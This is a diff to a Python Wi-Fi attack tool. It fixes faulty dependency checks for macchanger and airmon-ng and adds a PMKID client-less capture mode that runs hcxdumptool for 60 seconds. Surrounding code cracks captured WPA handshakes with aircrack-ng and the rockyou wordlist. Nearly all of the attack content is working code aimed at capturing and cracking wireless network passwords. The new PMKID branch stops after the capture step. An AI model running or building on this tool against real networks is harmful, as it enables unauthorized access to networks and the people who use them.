@@ -30,7 +30,7 @@ def get_colours(text, color):
 
 def menu_panel():
     get_colours("\n[*] Usage: python3 main.py <Network InterFace> <parameters>", "green")
-    get_colours("1. (-a)  Attack mode", "yellow")
+    get_colours("\n1. (-a)  Attack mode", "yellow")
     get_colours(f"\t Handshake", "yellow")
     get_colours(f"\t PKMID (Not Working)", "cyan")
     get_colours("2. (-n) Network card name", "yellow")
@@ -40,7 +40,7 @@ def menu_panel():
 def check_deps():
     get_colours("\nChecking necessary programs...", "cyan")
     check_macchanger = subprocess.run(["which", "macchanger"], capture_output=True, text=True)
-    if "/usr/bin/macchanger" or "/usr/sbin/macchanger" in check_macchanger.stdout:
+    if "/usr/bin/macchanger" in check_macchanger.stdout or "/usr/sbin/macchanger" in check_macchanger.stdout:
         get_colours(f"\nMacchanger\t\t {Fore.GREEN + '(V)'}", "magenta")
     else:
         get_colours(f"\nMacchanger \t\t {Fore.RED + '(X)'}", "red")
@@ -50,7 +50,7 @@ def check_deps():
         if "Setting up macchanger" in install_macchanger.stdout:
             get_colours("Macchanger Installed...", "blue")
     check_airmon_ng = subprocess.run(["which", "airmon-ng"], capture_output=True, text=True)
-  if "/usr/bin/airmon-ng"  or "/usr/sbin/airmon-ng" in check_airmon_ng.stdout:
+    if "/usr/bin/airmon-ng" in check_airmon_ng.stdout or "/usr/sbin/airmon-ng" in check_airmon_ng.stdout:
         get_colours(f"\nAirmon-ng \t\t {Fore.GREEN + '(V)'}", "magenta")
     else:
         get_colours(f"\nAirmon-ng \t\t {Fore.RED + '(X)'}", "red")
@@ -97,7 +97,16 @@ def attack_func(network_interface, attack_mode):
         airodump_pid_handshake = subprocess.run(["pgrep", "xterm"], capture_output=True, text=True)
         os.system(f"sudo kill {airodump_pid_handshake.stdout}")
         os.system("xterm -hold -e aircrack-ng -w /usr/share/wordlists/rockyou.txt HandShake-Capture/Capture-01.cap &")
-
+    elif attack_mode == "PKMID":
+        subprocess.run(["clear"])
+        time.sleep(1)
+        get_colours("Starting the PKMID Client-Less ATTACK", "magenta")
+        time.sleep(3)
+        get_colours("", "yellow")
+        subprocess.run(["timeout", "60", "hcxdumptool", "-i", network_interface + "mon", "--enable_status=1", "-o", "Capture_PKMID"])
+        get_colours("\nGetting hashes", "magenta")
+        time.sleep(3)
+        
 
 def stop_attack(network_interface, attack_parm):
     if attack_parm == "STOP":
